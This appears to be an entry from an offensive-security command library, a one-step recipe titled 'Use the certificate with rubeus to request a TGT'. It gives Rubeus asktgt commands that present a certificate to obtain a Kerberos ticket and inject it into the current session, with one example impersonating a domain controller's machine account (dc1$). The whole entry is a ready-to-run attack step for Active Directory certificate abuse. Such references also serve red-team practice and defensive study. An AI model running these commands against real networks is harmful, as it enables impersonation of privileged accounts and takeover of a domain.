---
id: b95c2771-c0bf-48b1-9419-39af900bca96
name: Use the certificate with rubeus to request a TGT
type: command
executor: bash
data: 'Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt

  Rubeus.exe asktgt /user:dc1$ /certificate:MIIRdQIBAzC...mUUXS /ptt'
output: null
created_at: '2023-04-06T03:56:05.989122+00:00'
updated_at: '2023-04-10T20:26:16.822815+00:00'
---

# Use the certificate with rubeus to request a TGT

```bash
Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt
Rubeus.exe asktgt /user:dc1$ /certificate:MIIRdQIBAzC...mUUXS /ptt
```
